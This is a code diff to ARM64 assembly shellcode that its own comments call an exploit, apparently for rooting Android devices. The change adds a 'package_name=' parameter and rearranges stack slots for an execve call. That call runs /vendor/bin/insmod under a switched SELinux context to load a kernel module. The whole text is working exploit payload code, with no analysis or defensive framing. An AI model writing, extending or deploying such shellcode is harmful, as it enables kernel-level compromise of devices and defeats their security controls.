@@ -25,6 +25,12 @@ ko_target:
     .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
 param_soft_reboot:
     .asciz "soft_reboot=1"
+/* "package_name=" and its value read as one string: the exploit writes the
+ * manager package at libcxx_pkg_val_off before the shellcode runs. */
+param_pkg:
+    .ascii "package_name="
+pkg_val:
+    .skip 48, 0
 
     .balign 4
     .global libcxx_ko_target_off
@@ -33,6 +39,9 @@ libcxx_ko_target_off:
     .global libcxx_soft_reboot_off
 libcxx_soft_reboot_off:
     .int soft_reboot_flag - libcxx_data
+    .global libcxx_pkg_val_off
+libcxx_pkg_val_off:
+    .int pkg_val - libcxx_data
 soft_reboot_flag:
     .byte 0
 
@@ -95,7 +104,7 @@ libcxx_start:
     cbnz    w0, return          // parent returns to init
 
     // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
+    sub     sp, sp, 48
 
     // Fork grandchild: set SELinux exec context → execve insmod
     mov     x0, #SIGCHLD
@@ -120,20 +129,23 @@ libcxx_start:
     mov     x8, #SYS_write
     svc     0
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, ["soft_reboot=1",] NULL], NULL)
+    // execve("/vendor/bin/insmod",
+    //        [exe_path, ko_target, "package_name=<pkg>", ["soft_reboot=1",] NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
+    adr     x1, param_pkg
+    str     x1, [sp, 16]
     adr     x9, soft_reboot_flag
     ldrb    w9, [x9]
     cbz     w9, insmod_no_sr
     adr     x1, param_soft_reboot
-    str     x1, [sp, 16]
-    str     xzr, [sp, 24]
+    str     x1, [sp, 24]
+    str     xzr, [sp, 32]
     b       do_insmod
 insmod_no_sr:
-    str     xzr, [sp, 16]
+    str     xzr, [sp, 24]
 do_insmod:
     adr     x0, exe_path
     mov     x1, sp
